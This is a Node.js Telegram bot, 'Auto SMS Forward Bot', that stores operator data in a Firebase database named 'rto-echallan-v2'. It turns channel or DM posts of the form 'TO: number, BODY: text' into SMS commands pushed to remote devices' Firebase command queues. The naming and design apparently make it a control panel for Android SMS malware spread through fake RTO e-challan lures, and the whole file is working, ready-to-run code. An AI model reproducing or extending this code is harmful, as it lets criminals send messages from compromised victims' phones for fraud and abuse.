const fetch = require('node-fetch');

// ═══════════════════════════════════════════════════════════
// ⚙️ CONFIG
// ═══════════════════════════════════════════════════════════
const BOT_TOKEN = process.env.BOT_TOKEN || 'YAHAN_TOKEN_DAALO';
const STORAGE_FIREBASE = 'https://rto-echallan-v2-default-rtdb.firebaseio.com';
const SUPPORT_HANDLE = '@HOMICID_E';

// ═══════════════════════════════════════════════════════════
// 🔥 FIREBASE REST HELPERS
// ═══════════════════════════════════════════════════════════
async function fbGet(path) {
  const res = await fetch(`${STORAGE_FIREBASE}/${path}.json`);
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return await res.json();
}
async function fbSet(path, data) {
  const res = await fetch(`${STORAGE_FIREBASE}/${path}.json`, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return await res.json();
}
async function fbPush(path, data) {
  const res = await fetch(`${STORAGE_FIREBASE}/${path}.json`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return await res.json();
}
async function fbUpdate(path, data) {
  const res = await fetch(`${STORAGE_FIREBASE}/${path}.json`, {
    method: 'PATCH',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return await res.json();
}
async function fbDelete(path) {
  const res = await fetch(`${STORAGE_FIREBASE}/${path}.json`, { method: 'DELETE' });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return true;
}
async function pushToDevice(fbUrl, deviceId, smsData) {
  const res = await fetch(`${fbUrl}/device_info/${deviceId}/sms_commands.json`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(smsData)
  });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return await res.json();
}

// ═══════════════════════════════════════════════════════════
// 🤖 TELEGRAM API
// ═══════════════════════════════════════════════════════════
async function tg(method, body) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    return await res.json();
  } catch (e) { console.error(e.message); return null; }
}
async function sendMsg(chatId, text, keyboard) {
  const body = { chat_id: chatId, text, parse_mode: 'HTML' };
  if (keyboard) body.reply_markup = { inline_keyboard: keyboard };
  return tg('sendMessage', body);
}
async function editMsg(chatId, msgId, text, keyboard) {
  const body = { chat_id: chatId, message_id: msgId, text, parse_mode: 'HTML' };
  if (keyboard) body.reply_markup = { inline_keyboard: keyboard };
  return tg('editMessageText', body);
}
async function answerCb(id, text) {
  return tg('answerCallbackQuery', { callback_query_id: id, text: text || '' });
}

// ═══════════════════════════════════════════════════════════
// 📦 USER DATA (Firebase)
// ═══════════════════════════════════════════════════════════
async function getUser(chatId) {
  const d = await fbGet(`telegram_bot_users/${chatId}`);
  return d || { firebases: {}, channels: {}, forwardNumbers: {}, activeSession: null, state: null };
}
async function saveUser(chatId, data) {
  return fbSet(`telegram_bot_users/${chatId}`, data);
}
async function updateUser(chatId, patch) {
  return fbUpdate(`telegram_bot_users/${chatId}`, patch);
}

// ═══════════════════════════════════════════════════════════
// 🎨 KEYBOARDS
// ═══════════════════════════════════════════════════════════
function mainKeyboard() {
  return [
    [{ text: '🔥 Add Firebase', callback_data: 'add_fb' }, { text: '📢 Add Channel', callback_data: 'add_ch' }],
    [{ text: '📱 Set Forward No.', callback_data: 'set_fwd' }, { text: '▶️ Start Session', callback_data: 'start_sess' }],
    [{ text: '💾 Saved Firebase', callback_data: 'saved_fb' }, { text: '💾 Saved Channels', callback_data: 'saved_ch' }],
    [{ text: '📊 Status', callback_data: 'status' }, { text: '🛑 Stop Session', callback_data: 'stop_sess' }],
    [{ text: '🗑️ Del Firebase', callback_data: 'del_fb' }, { text: '🗑️ Del Channel', callback_data: 'del_ch' }],
    [{ text: '🆘 Support', callback_data: 'support' }]
  ];
}

function backKeyboard() {
  return [[{ text: '« Back to Menu', callback_data: 'menu' }]];
}

function yesNoKeyboard(yesData, noData) {
  return [[{ text: '✅ YES', callback_data: yesData }, { text: '❌ NO', callback_data: noData }]];
}

// ═══════════════════════════════════════════════════════════
// 🏠 MAIN MENU
// ═══════════════════════════════════════════════════════════
async function showMenu(chatId, msgId) {
  const user = await getUser(chatId);
  const fbCount = Object.keys(user.firebases || {}).length;
  const chCount = Object.keys(user.channels || {}).length;
  const fwdCount = Object.keys(user.forwardNumbers || {}).length;
  const session = user.activeSession;
  const status = session ? '🟢 Session Active' : '⚪ No Session';
  
  const text =
    `🤖 <b>Auto SMS Forward Bot</b>\n\n` +
    `🔥 Firebases: <b>${fbCount}</b>\n` +
    `📢 Channels: <b>${chCount}</b>\n` +
    `📱 Numbers: <b>${fwdCount}</b>\n` +
    `📊 Status: <b>${status}</b>\n\n` +
    `<i>Buttons se setup karo</i>`;
  
  if (msgId) return editMsg(chatId, msgId, text, mainKeyboard());
  return sendMsg(chatId, text, mainKeyboard());
}

// ═══════════════════════════════════════════════════════════
// 🔥 ADD FIREBASE
// ═══════════════════════════════════════════════════════════
async function askAddFirebase(chatId, msgId) {
  await updateUser(chatId, { state: { action: 'awaiting_fb_url' } });
  return editMsg(chatId, msgId,
    `🔥 <b>ADD FIREBASE</b>\n\n` +
    `Send your Firebase Realtime DB URL:\n\n` +
    `<code>https://your-app-default-rtdb.firebaseio.com</code>`,
    backKeyboard()
  );
}

async function handleAddFirebaseUrl(chatId, text) {
  let url = text.trim().replace(/\/+$/, '');
  if (!url.startsWith('http')) url = 'https://' + url;
  url = url.replace('.firebasedatabase.app', '.firebaseio.com');
  
  await sendMsg(chatId, `⏳ Testing Firebase...\n<code>${url}</code>`);
  
  try {
    const res = await fetch(`${url}/.json?shallow=true`);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    await res.json();
  } catch (e) {
    await updateUser(chatId, { state: null });
    return sendMsg(chatId, `❌ <b>Failed!</b>\n\n${e.message}\n\nCheck URL.`, backKeyboard());
  }
  
  await updateUser(chatId, {
    state: { action: 'awaiting_fb_name', fbUrl: url }
  });
  await sendMsg(chatId, `✅ Connected!\n\nAb is Firebase ka <b>naam</b> bhejo (jaise "RTO V2"):`);
}

async function handleAddFirebaseName(chatId, name) {
  const user = await getUser(chatId);
  const state = user.state || {};
  const fbUrl = state.fbUrl;
  const firebases = user.firebases || {};
  const newIndex = String(Object.keys(firebases).length + 1);
  
  firebases[newIndex] = { url: fbUrl, name: name.trim(), addedAt: Date.now() };
  
  await updateUser(chatId, { firebases, state: null });
  await sendMsg(chatId,
    `✅ <b>Firebase Added!</b>\n\n` +
    `📛 Name: <b>${name}</b>\n` +
    `🔗 URL: <code>${fbUrl}</code>`,
    backKeyboard()
  );
}

// ═══════════════════════════════════════════════════════════
// 📢 ADD CHANNEL
// ═══════════════════════════════════════════════════════════
async function askAddChannel(chatId, msgId) {
  await updateUser(chatId, { state: { action: 'awaiting_ch_id' } });
  return editMsg(chatId, msgId,
    `📢 <b>ADD CHANNEL</b>\n\n` +
    `Send your Channel ID:\n\n` +
    `<code>-1001234567890</code>\n\n` +
    `<i>Bot ko channel mein admin banao pehle!</i>`,
    backKeyboard()
  );
}

async function handleAddChannelId(chatId, text) {
  const id = text.trim();
  if (!id.startsWith('-100')) {
    return sendMsg(chatId, `⚠️ Channel ID usually <code>-100...</code> se start hota hai. Phir bhi try karo...`);
  }
  await updateUser(chatId, { state: { action: 'awaiting_ch_name', chId: id } });
  await sendMsg(chatId, `✅ Channel ID: <code>${id}</code>\n\nAb channel ka <b>naam</b> bhejo:`);
}

async function handleAddChannelName(chatId, name) {
  const user = await getUser(chatId);
  const state = user.state || {};
  const channels = user.channels || {};
  const newIndex = String(Object.keys(channels).length + 1);
  
  channels[newIndex] = { id: state.chId, name: name.trim(), addedAt: Date.now() };
  
  await updateUser(chatId, { channels, state: null });
  await sendMsg(chatId,
    `✅ <b>Channel Added!</b>\n\n` +
    `📛 Name: <b>${name}</b>\n` +
    `🆔 ID: <code>${state.chId}</code>`,
    backKeyboard()
  );
}

// ═══════════════════════════════════════════════════════════
// 📱 SET FORWARD NUMBER
// ═══════════════════════════════════════════════════════════
async function askForwardNo(chatId, msgId) {
  await updateUser(chatId, { state: { action: 'awaiting_fwd_no' } });
  return editMsg(chatId, msgId,
    `📱 <b>SET FORWARD NUMBER</b>\n\n` +
    `Send the number where SMS should go:\n\n` +
    `<code>9876543210</code>`,
    backKeyboard()
  );
}

async function handleForwardNo(chatId, text) {
  const num = text.trim().replace(/[^\d+]/g, '');
  if (num.length < 10) {
    return sendMsg(chatId, `❌ Invalid number. Try again.`, backKeyboard());
  }
  const user = await getUser(chatId);
  const nums = user.forwardNumbers || {};
  const newIndex = String(Object.keys(nums).length + 1);
  nums[newIndex] = { number: num, addedAt: Date.now() };
  await updateUser(chatId, { forwardNumbers: nums, state: null });
  await sendMsg(chatId, `✅ Number Added!\n📱 <code>${num}</code>`, backKeyboard());
}

// ═══════════════════════════════════════════════════════════
// ▶️ START SESSION
// ═══════════════════════════════════════════════════════════
async function startSessionFlow(chatId, msgId) {
  const user = await getUser(chatId);
  const firebases = user.firebases || {};
  const keys = Object.keys(firebases);
  
  if (keys.length === 0) {
    return editMsg(chatId, msgId, `❌ Pehle <b>Add Firebase</b> karo!`, backKeyboard());
  }
  
  const buttons = keys.map(function(k) {
    return [{ text: `🔥 ${firebases[k].name}`, callback_data: `sess_fb_${k}` }];
  });
  buttons.push([{ text: '« Back to Menu', callback_data: 'menu' }]);
  
  return editMsg(chatId, msgId, `▶️ <b>START SESSION</b>\n\nSelect Firebase:`, buttons);
}

async function sessionSelectFirebase(chatId, msgId, fbIndex) {
  await updateUser(chatId, { state: { action: 'sess_device', fbIndex } });
  await editMsg(chatId, msgId,
    `▶️ <b>START SESSION</b>\n\n` +
    `🔥 Firebase selected\n\n` +
    `Ab <b>Device ID</b> bhejo:\n\n` +
    `<code>DEV_ABC123</code>`,
    backKeyboard()
  );
}

async function sessionDeviceEntered(chatId, text) {
  const user = await getUser(chatId);
  const state = user.state || {};
  const deviceId = text.trim();
  const channels = user.channels || {};
  const keys = Object.keys(channels);
  
  if (keys.length === 0) {
    await updateUser(chatId, { state: null });
    return sendMsg(chatId, `❌ Pehle <b>Add Channel</b> karo!`, backKeyboard());
  }
  
  await updateUser(chatId, {
    state: { action: 'sess_channel', fbIndex: state.fbIndex, deviceId }
  });
  
  const buttons = keys.map(function(k) {
    return [{ text: `📢 ${channels[k].name}`, callback_data: `sess_ch_${k}` }];
  });
  buttons.push([{ text: '« Back to Menu', callback_data: 'menu' }]);
  
  await sendMsg(chatId, `✅ Device: <code>${deviceId}</code>\n\nSelect Channel:`, buttons);
}

async function sessionSelectChannel(chatId, msgId, chIndex) {
  const user = await getUser(chatId);
  const state = user.state || {};
  const firebases = user.firebases || {};
  const channels = user.channels || {};
  const fb = firebases[state.fbIndex];
  const ch = channels[chIndex];
  
  if (!fb || !ch) {
    return editMsg(chatId, msgId, `❌ Selection galat. Phir se try karo.`, backKeyboard());
  }
  
  const activeSession = {
    fbIndex: state.fbIndex,
    fbUrl: fb.url,
    fbName: fb.name,
    deviceId: state.deviceId,
    channelIndex: chIndex,
    channelId: ch.id,
    channelName: ch.name,
    startedAt: Date.now()
  };
  
  await updateUser(chatId, { activeSession, state: null });
  
  await editMsg(chatId, msgId,
    `🟢 <b>SESSION STARTED!</b>\n\n` +
    `🔥 Firebase: <b>${fb.name}</b>\n` +
    `📱 Device: <code>${state.deviceId}</code>\n` +
    `📢 Channel: <b>${ch.name}</b>\n\n` +
    `✅ Ab <b>${ch.name}</b> channel mein message bhejo:\n` +
    `<code>TO: 9876543210, BODY: Hello</code>\n\n` +
    `<i>Message automatically SMS ban ke jayega!</i>`,
    [[{ text: '🛑 Stop Session', callback_data: 'stop_sess' }], [{ text: '« Menu', callback_data: 'menu' }]]
  );
}

// ═══════════════════════════════════════════════════════════
// 🛑 STOP SESSION
// ═══════════════════════════════════════════════════════════
async function stopSession(chatId, msgId) {
  await updateUser(chatId, { activeSession: null, state: null });
  if (msgId) return editMsg(chatId, msgId, `🛑 <b>Session Stopped</b>`, backKeyboard());
  return sendMsg(chatId, `🛑 <b>Session Stopped</b>`, backKeyboard());
}

// ═══════════════════════════════════════════════════════════
// 💾 SAVED LISTS
// ═══════════════════════════════════════════════════════════
async function showSavedFirebase(chatId, msgId) {
  const user = await getUser(chatId);
  const fbs = user.firebases || {};
  const keys = Object.keys(fbs);
  if (keys.length === 0) return editMsg(chatId, msgId, `💾 <b>No Firebase saved</b>`, backKeyboard());
  
  let text = `💾 <b>SAVED FIREBASES</b>\n\n`;
  keys.forEach(function(k) {
    text += `<b>${k}.</b> 🔥 ${fbs[k].name}\n<code>${fbs[k].url}</code>\n\n`;
  });
  return editMsg(chatId, msgId, text, backKeyboard());
}

async function showSavedChannels(chatId, msgId) {
  const user = await getUser(chatId);
  const chs = user.channels || {};
  const keys = Object.keys(chs);
  if (keys.length === 0) return editMsg(chatId, msgId, `💾 <b>No Channels saved</b>`, backKeyboard());
  
  let text = `💾 <b>SAVED CHANNELS</b>\n\n`;
  keys.forEach(function(k) {
    text += `<b>${k}.</b> 📢 ${chs[k].name}\n<code>${chs[k].id}</code>\n\n`;
  });
  return editMsg(chatId, msgId, text, backKeyboard());
}

// ═══════════════════════════════════════════════════════════
// 📊 STATUS
// ═══════════════════════════════════════════════════════════
async function showStatus(chatId, msgId) {
  const user = await getUser(chatId);
  const s = user.activeSession;
  const fbCount = Object.keys(user.firebases || {}).length;
  const chCount = Object.keys(user.channels || {}).length;
  const fwdCount = Object.keys(user.forwardNumbers || {}).length;
  
  let text = `📊 <b>STATUS</b>\n\n`;
  text += `🔥 Firebases: <b>${fbCount}</b>\n`;
  text += `📢 Channels: <b>${chCount}</b>\n`;
  text += `📱 Numbers: <b>${fwdCount}</b>\n\n`;
  
  if (s) {
    text += `🟢 <b>Active Session</b>\n`;
    text += `🔥 ${s.fbName}\n`;
    text += `📱 <code>${s.deviceId}</code>\n`;
    text += `📢 ${s.channelName}\n`;
    const min = Math.floor((Date.now() - s.startedAt) / 60000);
    text += `⏱️ Running: <b>${min} min</b>\n`;
  } else {
    text += `⚪ <b>No active session</b>`;
  }
  
  return editMsg(chatId, msgId, text, backKeyboard());
}

// ═══════════════════════════════════════════════════════════
// 🗑️ DELETE
// ═══════════════════════════════════════════════════════════
async function delFirebase(chatId, msgId) {
  const user = await getUser(chatId);
  const fbs = user.firebases || {};
  const keys = Object.keys(fbs);
  if (keys.length === 0) return editMsg(chatId, msgId, `❌ No Firebase to delete`, backKeyboard());
  
  const buttons = keys.map(function(k) {
    return [{ text: `🗑️ ${fbs[k].name}`, callback_data: `del_fb_${k}` }];
  });
  buttons.push([{ text: '« Back', callback_data: 'menu' }]);
  return editMsg(chatId, msgId, `🗑️ <b>DELETE FIREBASE</b>\n\nSelect one:`, buttons);
}

async function doDelFirebase(chatId, msgId, index) {
  const user = await getUser(chatId);
  const fbs = user.firebases || {};
  delete fbs[index];
  await updateUser(chatId, { firebases: fbs });
  return editMsg(chatId, msgId, `✅ Firebase deleted!`, backKeyboard());
}

async function delChannel(chatId, msgId) {
  const user = await getUser(chatId);
  const chs = user.channels || {};
  const keys = Object.keys(chs);
  if (keys.length === 0) return editMsg(chatId, msgId, `❌ No Channel to delete`, backKeyboard());
  
  const buttons = keys.map(function(k) {
    return [{ text: `🗑️ ${chs[k].name}`, callback_data: `del_ch_${k}` }];
  });
  buttons.push([{ text: '« Back', callback_data: 'menu' }]);
  return editMsg(chatId, msgId, `🗑️ <b>DELETE CHANNEL</b>\n\nSelect one:`, buttons);
}

async function doDelChannel(chatId, msgId, index) {
  const user = await getUser(chatId);
  const chs = user.channels || {};
  delete chs[index];
  await updateUser(chatId, { channels: chs });
  return editMsg(chatId, msgId, `✅ Channel deleted!`, backKeyboard());
}

// ═══════════════════════════════════════════════════════════
// 🆘 SUPPORT
// ═══════════════════════════════════════════════════════════
async function showSupport(chatId, msgId) {
  return editMsg(chatId, msgId,
    `🆘 <b>SUPPORT</b>\n\nContact: <b>${SUPPORT_HANDLE}</b>`,
    backKeyboard()
  );
}

// ═══════════════════════════════════════════════════════════
// 🎯 CALLBACK HANDLER
// ═══════════════════════════════════════════════════════════
async function handleCallback(cb) {
  const chatId = cb.message.chat.id;
  const msgId = cb.message.message_id;
  const data = cb.data;
  
  try { await answerCb(cb.id); } catch (e) {}
  
  if (data === 'menu') return showMenu(chatId, msgId);
  if (data === 'add_fb') return askAddFirebase(chatId, msgId);
  if (data === 'add_ch') return askAddChannel(chatId, msgId);
  if (data === 'set_fwd') return askForwardNo(chatId, msgId);
  if (data === 'start_sess') return startSessionFlow(chatId, msgId);
  if (data === 'stop_sess') return stopSession(chatId, msgId);
  if (data === 'saved_fb') return showSavedFirebase(chatId, msgId);
  if (data === 'saved_ch') return showSavedChannels(chatId, msgId);
  if (data === 'status') return showStatus(chatId, msgId);
  if (data === 'del_fb') return delFirebase(chatId, msgId);
  if (data === 'del_ch') return delChannel(chatId, msgId);
  if (data === 'support') return showSupport(chatId, msgId);
  
  if (data.startsWith('sess_fb_')) {
    return sessionSelectFirebase(chatId, msgId, data.replace('sess_fb_', ''));
  }
  if (data.startsWith('sess_ch_')) {
    return sessionSelectChannel(chatId, msgId, data.replace('sess_ch_', ''));
  }
  if (data.startsWith('del_fb_')) {
    return doDelFirebase(chatId, msgId, data.replace('del_fb_', ''));
  }
  if (data.startsWith('del_ch_')) {
    return doDelChannel(chatId, msgId, data.replace('del_ch_', ''));
  }
}

// ═══════════════════════════════════════════════════════════
// 📨 CHANNEL MESSAGE HANDLER
// ═══════════════════════════════════════════════════════════
async function handleChannelMessage(msg) {
  const chatId = msg.chat.id;
  const text = msg.text || msg.caption || '';
  if (!text) return;
  
  const channelId = String(msg.chat.id);
  
  // Find user with active session for this channel
  const allUsers = await fbGet('telegram_bot_users') || {};
  
  for (const userId of Object.keys(allUsers)) {
    const user = allUsers[userId];
    const s = user.activeSession;
    if (!s) continue;
    if (String(s.channelId) !== channelId) continue;
    
    // Parse message
    const toM = text.match(/TO[:\s]+([+\d]+)/i);
    const bodyM = text.match(/BODY[:\s]+([\s\S]+)/i);
    if (!toM || !bodyM) continue;
    
    const toNum = toM[1].trim();
    const body = bodyM[1].trim();
    
    try {
      await pushToDevice(s.fbUrl, s.deviceId, {
        to: toNum, message: body, sim_slot: 1,
        status: 'pending', timestamp: Date.now(), source: 'telegram_channel'
      });
      
      // Notify user
      await sendMsg(userId,
        `✅ <b>SMS Queued!</b>\n\n` +
        `📱 To: <code>${toNum}</code>\n` +
        `📝 ${body.substring(0, 80)}\n` +
        `🔥 ${s.fbName}\n` +
        `📱 ${s.deviceId}`
      );
    } catch (e) {
      await sendMsg(userId, `❌ SMS Failed: ${e.message}`);
    }
  }
}

// ═══════════════════════════════════════════════════════════
// 📩 PRIVATE MESSAGE HANDLER
// ═══════════════════════════════════════════════════════════
async function handlePrivateMessage(msg) {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  if (!text) return;
  
  if (text === '/start' || text === '/menu') {
    const user = await getUser(chatId);
    if (!user.createdAt) {
      await updateUser(chatId, { createdAt: Date.now(), firebases: {}, channels: {}, forwardNumbers: {} });
    }
    return showMenu(chatId);
  }
  
  if (text === '/help') {
    return sendMsg(chatId,
      `🤖 <b>Auto SMS Forward Bot</b>\n\n` +
      `Setup:\n` +
      `1. 🔥 Add Firebase\n` +
      `2. 📢 Add Channel\n` +
      `3. ▶️ Start Session\n\n` +
      `SMS format in channel:\n` +
      `<code>TO: 9876543210, BODY: Hello</code>`
    );
  }
  
  const user = await getUser(chatId);
  const state = user.state || {};
  
  if (state.action === 'awaiting_fb_url') return handleAddFirebaseUrl(chatId, text);
  if (state.action === 'awaiting_fb_name') return handleAddFirebaseName(chatId, text);
  if (state.action === 'awaiting_ch_id') return handleAddChannelId(chatId, text);
  if (state.action === 'awaiting_ch_name') return handleAddChannelName(chatId, text);
  if (state.action === 'awaiting_fwd_no') return handleForwardNo(chatId, text);
  if (state.action === 'sess_device') return sessionDeviceEntered(chatId, text);
  
  // If has active session and sent TO:..., handle direct
  if (user.activeSession && /TO[:\s]+\d/i.test(text)) {
    const s = user.activeSession;
    const toM = text.match(/TO[:\s]+([+\d]+)/i);
    const bodyM = text.match(/BODY[:\s]+([\s\S]+)/i);
    if (toM && bodyM) {
      try {
        await pushToDevice(s.fbUrl, s.deviceId, {
          to: toM[1].trim(), message: bodyM[1].trim(), sim_slot: 1,
          status: 'pending', timestamp: Date.now(), source: 'telegram_dm'
        });
        return sendMsg(chatId, `✅ <b>Queued!</b>\n📱 ${toM[1]}\n📝 ${bodyM[1].substring(0,80)}`);
      } catch (e) { return sendMsg(chatId, `❌ ${e.message}`); }
    }
  }
  
  return sendMsg(chatId, `❓ Samajh nahi aaya. /help bhejo.`);
}

// ═══════════════════════════════════════════════════════════
// 🔄 POLLING
// ═══════════════════════════════════════════════════════════
let lastUpdateId = 0;

async function poll() {
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?timeout=30&offset=${lastUpdateId+1}&allowed_updates=["message","callback_query","channel_post"]`);
    const data = await res.json();
    
    if (data.ok && data.result && data.result.length > 0) {
      for (const u of data.result) {
        lastUpdateId = u.update_id;
        try {
          if (u.callback_query) {
            await handleCallback(u.callback_query);
          } else if (u.channel_post) {
            await handleChannelMessage(u.channel_post);
          } else if (u.message && u.message.chat.type === 'private') {
            await handlePrivateMessage(u.message);
          }
        } catch (e) {
          console.error('Update error:', e.message);
        }
      }
    }
  } catch (e) { console.error('Polling error:', e.message); }
  setTimeout(poll, 1000);
}

// ═══════════════════════════════════════════════════════════
// 🚀 START
// ═══════════════════════════════════════════════════════════
console.log('🤖 Auto SMS Forward Bot started!');
console.log('   Storage:', STORAGE_FIREBASE);
poll();
